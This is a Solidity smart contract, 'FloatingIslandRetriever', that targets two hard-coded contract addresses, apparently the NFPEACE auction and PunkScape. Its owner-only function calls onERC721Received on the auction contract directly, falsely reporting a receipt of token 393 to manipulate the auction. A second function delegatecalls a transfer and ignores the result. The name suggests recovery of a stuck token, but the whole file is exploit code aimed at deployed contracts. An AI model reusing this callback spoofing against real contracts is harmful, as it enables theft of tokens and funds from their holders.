// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/utils/introspection/ERC165.sol";

import "hardhat/console.sol";

contract FloatingIslandRetriever is Ownable {
    address public constant NFPEACE = 0x0000000011E48D382b4F627437A2bBAc3b10F90e;
    address public constant PUNKSCAPE = 0x51Ae5e2533854495f6c587865Af64119db8F59b4;

    address public punkScape;

    constructor (address _punkScape) {
        punkScape = _punkScape;
    }

    function initializeAuction () external onlyOwner {
        IERC721Receiver(NFPEACE).onERC721Received(
            address(this),  // operator
            NFPEACE,        // from
            393,            // tokenId
            ""              // callData
        );
    }

    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes memory
    ) public {
        (bool success,) = punkScape.delegatecall{gas: 100000}(
            abi.encodeWithSignature("transferFrom(address,address,uint256)", from, to, tokenId)
        );
    }
}
